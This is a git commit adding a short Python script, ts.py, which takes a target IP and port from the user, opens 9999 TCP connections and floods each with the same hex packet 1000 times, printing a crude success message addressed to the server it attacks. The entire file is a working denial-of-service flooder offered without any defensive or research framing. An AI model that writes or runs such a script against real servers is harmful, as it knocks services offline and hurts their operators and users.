6e92578e0e648421be7ec98a67df9b1971b55827
Ameir07 <87196011+Ameir07@users.noreply.github.com>
2024-10-12 19:06:18 +0300

    Create ts.py

---
+++ ts.py
@@ -0,0 +1,23 @@
+import socket
+import time
+
+ip = input("IP: ")
+port = int(input("Port: "))
+num_connections = 9999
+
+packet = bytes.fromhex("F10400010900000001000000F2")
+num_send_per_connection = 1000
+
+for _ in range(num_connections):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        try:
+            s.connect((ip, port))
+            
+            for _ in range(num_send_per_connection):
+                s.sendall(packet)
+            
+            print(f"Done Fuck Server {ip} <3")
+        except Exception as e:
+            print(f"Error: {e}")
+
+        time.sleep(0)
